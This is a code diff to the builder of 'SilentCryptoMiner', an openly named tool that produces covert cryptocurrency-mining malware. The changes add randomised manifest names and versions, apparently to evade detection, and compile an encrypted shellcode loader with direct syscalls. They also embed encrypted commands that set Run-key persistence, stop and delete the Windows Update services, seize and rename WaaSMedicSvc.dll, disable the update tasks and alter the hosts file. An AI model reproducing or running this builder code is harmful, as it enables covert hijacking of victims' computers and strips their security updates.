@@ -24,7 +24,7 @@ namespace SilentCryptoMiner
             var parameters = new CompilerParameters();
             string OP = " /target:winexe /platform:x64 /optimize ";
 
-            File.WriteAllBytes(savePath + ".manifest", requireAdministrator ? Properties.Resources.administrator : Properties.Resources.user);
+            CreateManifest(savePath + ".manifest", requireAdministrator);
             OP += " /win32manifest:\"" + savePath + ".manifest" + "\"";
 
             if (!F.toggleShellcode.Checked)
@@ -109,7 +109,7 @@ namespace SilentCryptoMiner
             var parameters = new CompilerParameters();
             string OP = " /target:winexe /platform:x64 /optimize ";
 
-            File.WriteAllBytes(savePath + ".manifest", requireAdministrator ? Properties.Resources.administrator : Properties.Resources.user);
+            CreateManifest(savePath + ".manifest", requireAdministrator);
             OP += " /win32manifest:\"" + savePath + ".manifest" + "\"";
 
             parameters.GenerateExecutable = true;
@@ -158,7 +158,7 @@ namespace SilentCryptoMiner
             var parameters = new CompilerParameters();
             string OP = " /target:exe /platform:x64 /optimize ";
 
-            File.WriteAllBytes(savePath + ".manifest", F.toggleAdministrator.Checked ? Properties.Resources.administrator : Properties.Resources.user);
+            CreateManifest(savePath + ".manifest", F.toggleAdministrator.Checked);
             OP += " /win32manifest:\"" + savePath + ".manifest" + "\"";
 
             parameters.GenerateExecutable = true;
@@ -208,7 +208,7 @@ namespace SilentCryptoMiner
             var parameters = new CompilerParameters();
             string OP = " /target:winexe /platform:x64 /optimize ";
 
-            File.WriteAllBytes(savePath + ".manifest", F.toggleAdministrator.Checked ? Properties.Resources.administrator : Properties.Resources.user);
+            CreateManifest(savePath + ".manifest", F.toggleAdministrator.Checked);
             OP += " /win32manifest:\"" + savePath + ".manifest" + "\"";
 
             parameters.GenerateExecutable = true;
@@ -263,7 +263,7 @@ namespace SilentCryptoMiner
             return true;
         }
 
-        public static bool LoaderCompiler(string savePath, string inputFile, string args, string icoPath = "", bool AssemblyData = false, bool requireAdministrator = false)
+        public static bool LoaderCompiler(string savePath, string inputFile, string args, string icoPath = "", bool assemblyData = false, bool requireAdministrator = false)
         {
             try
             {
@@ -278,7 +278,7 @@ namespace SilentCryptoMiner
                     { "windreslog", Path.Combine(currentDirectory, @"Compilers\logs\windres.log") }, 
                     { "tcclog", Path.Combine(currentDirectory, @"Compilers\logs\tcc.log") }, 
                     { "donutlog", Path.Combine(currentDirectory, @"Compilers\logs\donut.log") }, 
-                    { "manifest", Path.Combine(currentDirectory, "administrator.manifest") }, 
+                    { "manifest", Path.Combine(currentDirectory, "loader.manifest") }, 
                     { "resource.rc", Path.Combine(currentDirectory, "resource.rc") }, 
                     { "resource.o", Path.Combine(currentDirectory, "resource.o") },
                     { "filename", Path.Combine(currentDirectory, filename) } };
@@ -292,45 +292,39 @@ namespace SilentCryptoMiner
                     return false;
 
                 var sb = new StringBuilder(Properties.Resources.Loader);
-                bool buildResource = !string.IsNullOrEmpty(icoPath) || requireAdministrator || AssemblyData;
-                if (buildResource)
+
+                if (F.BuildErrorTest(!string.Join("", new string[] { F.txtAssemblyVersion1.Text, F.txtAssemblyVersion2.Text, F.txtAssemblyVersion3.Text, F.txtAssemblyVersion4.Text }).All(new Func<char, bool>(char.IsDigit)), "Error: Assembly Version must only contain numbers."))
+                    return false;
+
+                var resource = new StringBuilder(Properties.Resources.resource);
+                string defs = "";
+                if (!string.IsNullOrEmpty(icoPath))
                 {
-                    if (F.BuildErrorTest(!string.Join("", new string[] { F.txtAssemblyVersion1.Text, F.txtAssemblyVersion2.Text, F.txtAssemblyVersion3.Text, F.txtAssemblyVersion4.Text }).All(new Func<char, bool>(char.IsDigit)), "Error: Assembly Version must only contain numbers."))
-                        return false;
-                    var resource = new StringBuilder(Properties.Resources.resource);
-                    string defs = "";
-                    if (!string.IsNullOrEmpty(icoPath))
-                    {
-                        resource.Replace("#ICON", ToLiteral(icoPath));
-                        defs += " -DDefIcon";
-                    }
-
-                    if (requireAdministrator)
-                    {
-                        File.WriteAllBytes(paths["manifest"], Properties.Resources.administrator);
-                        defs += " -DDefAdmin";
-                        sb.Replace("DefWD", "TRUE");
-                    }
-
-                    if (AssemblyData)
-                    {
-                        resource.Replace("#TITLE", ToLiteral(F.txtAssemblyTitle.Text));
-                        resource.Replace("#DESCRIPTION", ToLiteral(F.txtAssemblyDescription.Text));
-                        resource.Replace("#COMPANY", ToLiteral(F.txtAssemblyCompany.Text));
-                        resource.Replace("#PRODUCT", ToLiteral(F.txtAssemblyProduct.Text));
-                        resource.Replace("#COPYRIGHT", ToLiteral(F.txtAssemblyCopyright.Text));
-                        resource.Replace("#TRADEMARK", ToLiteral(F.txtAssemblyTrademark.Text));
-                        resource.Replace("#VERSION", string.Join(",", new string[] { F.txtAssemblyVersion1.Text, F.txtAssemblyVersion2.Text, F.txtAssemblyVersion3.Text, F.txtAssemblyVersion4.Text }));
-                        defs += " -DDefAssembly";
-                    }
-
-                    File.WriteAllText(paths["resource.rc"], resource.ToString());
-                    RunExternalProgram("cmd", string.Format("cmd /c \"{0}\" --input resource.rc --output resource.o -O coff {1}", paths["windres"], defs), currentDirectory, paths["windreslog"]);
-                    File.Delete(paths["resource.rc"]);
-                    File.Delete(paths["manifest"]);
-                    if (F.BuildErrorTest(!File.Exists(paths["resource.o"]), string.Format("Error: Failed at compiling resources, check the error log at {0}.", paths["windreslog"])))
-                        return false;
+                    resource.Replace("#ICON", ToLiteral(icoPath));
+                    defs += " -DDefIcon";
                 }
+
+                if (assemblyData)
+                {
+                    resource.Replace("#TITLE", ToLiteral(F.txtAssemblyTitle.Text));
+                    resource.Replace("#DESCRIPTION", ToLiteral(F.txtAssemblyDescription.Text));
+                    resource.Replace("#COMPANY", ToLiteral(F.txtAssemblyCompany.Text));
+                    resource.Replace("#PRODUCT", ToLiteral(F.txtAssemblyProduct.Text));
+                    resource.Replace("#COPYRIGHT", ToLiteral(F.txtAssemblyCopyright.Text));
+                    resource.Replace("#TRADEMARK", ToLiteral(F.txtAssemblyTrademark.Text));
+                    resource.Replace("#VERSION", string.Join(",", new string[] { F.txtAssemblyVersion1.Text, F.txtAssemblyVersion2.Text, F.txtAssemblyVersion3.Text, F.txtAssemblyVersion4.Text }));
+                    defs += " -DDefAssembly";
+                }
+
+                CreateManifest(paths["manifest"], requireAdministrator);
+
+                File.WriteAllText(paths["resource.rc"], resource.ToString());
+                RunExternalProgram("cmd", string.Format("cmd /c \"{0}\" --input resource.rc --output resource.o -O coff {1}", paths["windres"], defs), currentDirectory, paths["windreslog"]);
+                File.Delete(paths["resource.rc"]);
+                File.Delete(paths["manifest"]);
+                if (F.BuildErrorTest(!File.Exists(paths["resource.o"]), string.Format("Error: Failed at compiling resources, check the error log at {0}.", paths["windreslog"])))
+                    return false;
+                
 
                 string shellcodebytes = Encoding.GetEncoding("ISO-8859-1").GetString(ConvertToShellcode(inputFile));
                 string shellcode = ToLiteral(Cipher(shellcodebytes, F.KEY));
@@ -346,7 +340,7 @@ namespace SilentCryptoMiner
                 CipherReplace(sb, "#FORMAT2", "\"%s\" \"%s\"");
                 
                 File.WriteAllText(paths["filename"] + ".c", sb.ToString(), Encoding.GetEncoding("ISO-8859-1"));
-                RunExternalProgram(paths["tcc"], string.Format("-Wl,-subsystem=windows \"{0}\" {1} \"{2}\" -xa \"{3}\" -m64", filename + ".c", buildResource ? "resource.o" : "", Path.Combine(currentDirectory, @"Includes\syscalls.c"), Path.Combine(currentDirectory, @"Includes\syscallsstubs.asm")), currentDirectory, paths["tcclog"]);
+                RunExternalProgram(paths["tcc"], string.Format("-Wl,-subsystem=windows \"{0}\" {1} \"{2}\" -xa \"{3}\" -m64", filename + ".c", "resource.o", Path.Combine(currentDirectory, @"Includes\syscalls.c"), Path.Combine(currentDirectory, @"Includes\syscallsstubs.asm")), currentDirectory, paths["tcclog"]);
                 File.Delete(paths["resource.o"]);
                 File.Delete(paths["filename"] + ".c");
                 if (F.BuildErrorTest(!File.Exists(paths["filename"] + ".exe"), string.Format("Error: Failed at compiling program, check the error log at {0}.", paths["tcclog"])))
@@ -478,6 +472,15 @@ namespace SilentCryptoMiner
             return literal.ToString();
         }
 
+        public static void CreateManifest(string path, bool administrator)
+        {
+            var mb = new StringBuilder(Properties.Resources.template);
+            mb.Replace("#MANIFESTVERSION", $"{F.rand.Next(0, 10)}.{F.rand.Next(0, 10)}.{F.rand.Next(0, 10)}.{F.rand.Next(0, 10)}");
+            mb.Replace("#MANIFESTNAME", F.Randomi(F.rand.Next(10, 40), false));
+            mb.Replace("#MANIFESTLEVEL", administrator ? "requireAdministrator" : "asInvoker");
+            File.WriteAllText(path, mb.ToString());
+        }
+
         public static void ReplaceGlobals(ref StringBuilder stringb)
         {
             if (F.mineXMR)
@@ -587,6 +590,11 @@ namespace SilentCryptoMiner
                 {
                     stringb.Replace("DefMinerOverwrite", "true");
                 }
+
+                if (!F.FormAO.toggleNoRunInstall.Checked)
+                {
+                    stringb.Replace("DefRunInstall", "true");
+                }
             }
 
             if (F.chkAssembly.Checked)
@@ -615,9 +623,10 @@ namespace SilentCryptoMiner
             stringb.Replace("#REGADD", F.EncryptString($"cmd /c reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{F.txtInstallEntryName.Text}\" /t REG_SZ /f /d \"{{0}}\""));
             stringb.Replace("#REGREM", F.EncryptString($"cmd /c reg delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{F.txtInstallEntryName.Text}\" /f"));
             stringb.Replace("#POWERCFG", F.EncryptString(@"cmd /c powercfg /x -hibernate-timeout-ac 0 & powercfg /x -hibernate-timeout-dc 0 & powercfg /x -standby-timeout-ac 0 & powercfg /x -standby-timeout-dc 0"));
-            stringb.Replace("#WUPDATE", F.EncryptString(@"cmd /c sc stop wuauserv & sc stop bits & sc stop dosvc & sc stop UsoSvc & sc stop WaaSMedicSvc & sc config wuauserv start= disabled & sc failure wuauserv reset= 0 actions= """" & sc config bits start= disabled & sc failure bits reset= 0 actions= """" & sc config dosvc start= disabled & sc failure dosvc reset= 0 actions= """" & sc config UsoSvc start= disabled & sc failure UsoSvc reset= 0 actions= """" & sc config wuauserv start= disabled & sc failure wuauserv reset= 0 actions= """" & takeown /f C:\\Windows\\System32\\WaaSMedicSvc.dll & icacls C:\\Windows\\System32\\WaaSMedicSvc.dll /grant *S-1-1-0:F /t /c /l /q & rename C:\\Windows\\System32\\WaaSMedicSvc.dll WaaSMedicSvc_BAK.dll & reg add ""HKLM\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc"" /v Start /t REG_DWORD /d 4 /f & reg add ""HKLM\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc"" /v FailureActions /t REG_BINARY /d 000000000000000000000000030000001400000000000000c0d4010000000000e09304000000000000000000 /f & reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v AUOptions /d 2 /t REG_DWORD /f & reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v AutoInstallMinorUpdates /d 0 /t REG_DWORD /f & reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAutoUpdate /d 1 /t REG_DWORD /f & reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAutoRebootWithLoggedOnUsers /d 1 /t REG_DWORD /f & SCHTASKS /Change /TN ""\\Microsoft\\Windows\\WindowsUpdate\\Automatic App Update"" /DISABLE & SCHTASKS /Change /TN ""\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Start"" /DISABLE & SCHTASKS /Change /TN ""\\Microsoft\\Windows\\WindowsUpdate\\sih"" /DISABLE & SCHTASKS /Change /TN ""\\Microsoft\\Windows\\WindowsUpdate\\sihboot"" /DISABLE & SCHTASKS /Change /TN ""\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateAssistant"" /DISABLE & SCHTASKS /Change /TN ""\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateAssistantCalendarRun"" /DISABLE & SCHTASKS /Change /TN ""\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateAssistantWakeupRun"" /DISABLE"));
+            stringb.Replace("#WUPDATE", F.EncryptString("cmd /c sc stop UsoSvc & sc stop WaaSMedicSvc & sc stop wuauserv & sc stop bits & sc stop dosvc & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc /f & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc /f & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\wuauserv /f & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\bits /f & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\dosvc /f & takeown /f %SystemRoot%\\System32\\WaaSMedicSvc.dll & icacls %SystemRoot%\\System32\\WaaSMedicSvc.dll /grant *S-1-1-0:F /t /c /l /q & rename %SystemRoot%\\System32\\WaaSMedicSvc.dll WaaSMedicSvc_BAK.dll & reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v AUOptions /d 2 /t REG_DWORD /f & reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v AutoInstallMinorUpdates /d 0 /t REG_DWORD /f & reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAutoUpdate /d 1 /t REG_DWORD /f & reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAutoRebootWithLoggedOnUsers /d 1 /t REG_DWORD /f & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\WindowsUpdate\\Automatic App Update\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Start\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\WindowsUpdate\\sih\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\WindowsUpdate\\sihboot\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateAssistant\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateAssistantCalendarRun\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateAssistantWakeupRun\" /DISABLE"));
             stringb.Replace("#MINERQUERY", F.EncryptString($"Select CommandLine from Win32_Process WHERE CommandLine LIKE '%{F.minerFind}%'"));
             stringb.Replace("#GPUQUERY", F.EncryptString("SELECT Name, VideoProcessor FROM Win32_VideoController"));
+            stringb.Replace("#WMISCOPE", F.EncryptString(@"\root\cimv2"));
             stringb.Replace("#MINERID", F.EncryptString(F.minerFind));
             stringb.Replace("#SCMD", F.EncryptString("cmd"));
             stringb.Replace("#CMDSTART", F.EncryptString("cmd /c \"{0}\""));
@@ -626,9 +635,14 @@ namespace SilentCryptoMiner
             stringb.Replace("#SYSTEMROOT", F.EncryptString("SystemRoot"));
             stringb.Replace("#CONHOST", F.EncryptString("System32\\conhost.exe"));
             stringb.Replace("#HOSTSPATH", F.EncryptString("drivers/etc/hosts"));
-            stringb.Replace("#HOSTSFORMAT", F.EncryptString("\r\n127.0.0.1       {0}"));
+            stringb.Replace("#HOSTSFORMAT", F.EncryptString("\r\n0.0.0.0       {0}"));
             stringb.Replace("#RUNPETYPE", F.EncryptString("RunPE.RunPE"));
             stringb.Replace("#RUNPEMETHOD", F.EncryptString("Run"));
+            stringb.Replace("#INSTALLPATH", F.EncryptString(F.txtInstallFileName.Text));
+            stringb.Replace("#SYSTEMNAME", F.EncryptString("System"));
+
+            stringb.Replace("#STRNVIDIA", F.EncryptString("nvidia"));
+            stringb.Replace("#STRAMD", F.EncryptString("amd"));
 
             stringb.Replace("#KEY", F.AESKEY);
             stringb.Replace("#SALT", F.SALT);
